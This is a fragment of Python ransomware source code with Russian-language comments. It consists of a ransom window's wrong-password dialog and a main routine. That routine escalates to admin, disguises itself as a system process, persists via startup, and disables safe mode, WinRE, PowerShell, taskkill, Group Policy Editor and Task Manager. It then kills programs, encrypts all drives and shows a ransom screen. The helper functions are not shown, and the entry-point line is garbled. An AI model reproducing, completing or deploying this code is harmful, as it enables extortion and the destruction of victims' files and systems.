        else:
            self.attempts_left -= 1
            self.attempts_label.config(text=f"Attempts left: {self.attempts_left}")
            error_window = tk.Toplevel(self.root)
            error_window.overrideredirect(True)
            error_window.configure(bg="#000000")
            error_window.geometry("400x200+500+300")
            frame = tk.Frame(error_window, bg="#000000", bd=5, relief="ridge")
            frame.pack(expand=True, fill="both", padx=5, pady=5)
            tk.Label(
                frame,
                text="INCORRECT PASSWORD!",
                font=("Impact", 24),
                fg="#FF0000",
                bg="#000000"
            ).pack(pady=20)
            tk.Label(
                frame,
                text="All your files remain encrypted.",
                font=("Arial", 12),
                fg="#FFFFFF",
                bg="#000000"
            ).pack(pady=10)
            tk.Button(
                frame,
                text="OK",
                command=error_window.destroy,
                font=("Arial", 12, "bold"),
                bg="#FF0000",
                fg="#FFFFFF",
                width=10
            ).pack(pady=20)
# Основная функция
def main():
    logging.info("Запуск ransomware...")
    print("Starting ransomware...")
    # Проверка прав администратора
    run_as_admin()
    
    # Маскировка под системный процесс
    if not mask_as_system_process():
        logging.warning("Не удалось замаскировать процесс, продолжаем...")
        print("Не удалось замаскировать процесс, продолжаем...")
    
    # Добавление в автозагрузку
    if not add_to_startup():
        logging.error("Не удалось добавить в автозагрузку, продолжаем...")
        print("Не удалось добавить в автозагрузку, продолжаем...")
    
    # Блокировка безопасного режима
    if not disable_safe_mode():
        logging.error("Не удалось заблокировать безопасный режим, продолжаем...")
        print("Не удалось заблокировать безопасный режим, продолжаем...")
    
    # Блокировка WinRE
    if not disable_winre():
        logging.error("Не удалось отключить WinRE, продолжаем...")
        print("Не удалось отключить WinRE, продолжаем...")
    
    # Блокировка PowerShell
    if not disable_powershell():
        logging.error("Не удалось заблокировать PowerShell, продолжаем...")
        print("Не удалось заблокировать PowerShell, продолжаем...")
    
    # Блокировка taskkill
    if not disable_taskkill():
        logging.error("Не удалось заблокировать taskkill, продолжаем...")
        print("Не удалось заблокировать taskkill, продолжаем...")
    
    # Блокировка редактора групповых политик
    if not disable_gpedit():
        logging.error("Не удалось заблокировать gpedit, продолжаем...")
        print("Не удалось заблокировать gpedit, продолжаем...")
    
    # Блокировка диспетчера задач
    if not disable_task_manager():
        logging.error("Не удалось заблокировать диспетчер задач, продолжаем...")
        print("Не удалось заблокировать диспетчер задач, продолжаем...")
    
    # Блокировка приложений
    if not block_applications():
        logging.error("Не удалось заблокировать приложения, продолжаем...")
        print("Не удалось заблокировать приложения, продолжаем...")
    
    # Завершение GUI-программ
    if not kill_gui_processes():
        logging.warning("Не удалось завершить GUI-процессы, продолжаем...")
        print("Не удалось завершить GUI-процессы, продолжаем...")
    
    # Запуск мониторинга защиты в отдельном потоке
    threading.Thread(target=monitor_protection, daemon=True).start()
    
    # Запуск шифрования всех дисков
    root = tk.Tk()
    app = RansomWindow(root)
    encrypted_files = encrypt_all_files(app.update_progress)
    logging.info(f"Зашифровано {len(encrypted_files)} файлов")
    print(f"Encrypted {len(encrypted_files)} files")
    print("Setting wallpaper...")
    set_wallpaper()
    logging.info("Показ окна выкупа...")
    print("Showing ransom window...")
    root.mainloop()
if **name** == "**main**":
    try:
        main()
    except Exception as e:
        logging.error(f"Критическая ошибка в main: {e}")
        print(f"Критическая ошибка: {e}")
        sys.exit(1)
